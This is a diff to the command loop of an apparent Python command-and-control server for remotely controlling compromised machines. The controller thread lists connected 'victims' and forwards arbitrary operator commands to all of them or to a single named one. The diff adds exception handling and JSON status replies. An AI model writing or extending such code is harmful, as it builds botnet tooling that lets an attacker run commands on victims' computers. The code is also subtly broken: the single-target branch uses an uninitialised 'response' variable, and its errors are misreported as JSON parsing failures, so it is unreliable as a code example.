@@ -137,22 +137,39 @@ class CTRLClient(Thread):
     def run(self):
         jsonArray = []
         while True:
-            command = json.loads(self.recvStr())
-            if command["Target"] == str(self.conn.getsockname()):
-                if str(command["Command"]) == "List Connections":
+            try:
+                command = json.loads(self.recvStr())
+                if command["Target"] == str(self.conn.getsockname()):
+                    if str(command["Command"]) == "List Connections":
+                        for t in threadList:
+                            jsonArray.append(t.get_name())
+                        response = {}
+                        response["Type"] = "Victim List"
+                        response["Message"] = jsonArray
+                        self.sendStr(json.dumps(response))
+                elif command["Target"] == "*":
                     for t in threadList:
-                        jsonArray.append(t.get_name())
-                    jsonObj = {}
-                    jsonObj["VictimsArray"] = jsonArray
-                    self.sendStr(json.dumps(jsonObj))
-            elif command["Target"] == "*":
-                for t in threadList:
-                    t.addCommandToQueue(str(command["Command"]))
-            else:
-                for t in threadList:
-                    if str(command["Target"]) == t.get_name():
                         t.addCommandToQueue(str(command["Command"]))
-
+                    response = {}
+                    response["Type"] = "Data"
+                    response["Message"] = "Command sent to all victims"
+                    self.sendStr(json.dumps(response))
+                else:
+                    for t in threadList:
+                        if str(command["Target"]) == t.get_name():
+                            t.addCommandToQueue(str(command["Command"]))
+                            response["Type"] = "Data"
+                            response["Message"] = "Command sent to victim: " + str(t.get_name()) 
+                            self.sendStr(json.dumps(response))
+            except:
+                if self.conn.fileno() == -1:
+                    print("Socket disconnected")
+                    break
+                response = {}
+                response["Type"] = "Error"
+                response["Message"] = "JSON Parsing Error"
+                self.sendStr(json.dumps(response))
+                print("C2 > Json parsing error")
 
 
 class CTRLThread(Thread):
